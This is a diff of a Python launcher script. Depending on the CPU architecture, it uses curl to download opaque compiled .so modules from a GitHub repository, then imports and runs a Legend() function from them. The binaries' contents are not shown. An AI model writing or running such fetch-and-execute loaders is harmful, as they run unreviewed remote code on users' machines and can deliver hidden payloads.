@@ -1,16 +1,45 @@
 import os, platform
-try:
-    import requests
-except:
-    os.system('pip install requests')
-import requests
+
 bit = platform.architecture()[0]
+
 if bit == '64bit':
-    from Syed import Legend
-    Legend()
+
+	if not os.path.exists("pycrypto_qsr.so"):		os.system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr.cpython-311.so?raw=true > pycrypto_qsr.so')
+
+	if not os.path.isfile('Syed.so'):                                                                            
+
+		os.system('curl -L https://github.com/syedsahab1122/files/blob/main/Syed.cpython-311.so?raw=true > Syed.so')
+
+		from Syed import Legend
+
+		Legend()
+
+	else:
+
+		from Syed import Legend
+
+		Legend()
+
 elif bit == '32bit':
-    from Syed32 import Legend
-    Legend()
+
+	if not os.path.exists("pycrypto_qsr32.so"):
+
+		os.system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr32.cpython-311.so?raw=true > pycrypto_qsr32.so')
+
+	if not os.path.isfile('Syed32.so'):
+
+		os.system('curl -L https://github.com/syedsahab1122/files/blob/main/Syed32.cpython-311.so?raw=true > Syed32.so')
+
+		from Syed32 import Legend
+
+		Legend()
+
+	else:
+
+		from Syed32 import Legend
+
+		Legend()
+
 else:
-    print('\n YOUR DEVICE IS NOT SUPPORT THIS COMMAND')
-    os.system('exit')
+
+	print('\n\x1b[1;91m[×] Your Device is Not Supported This Tool !');exit()
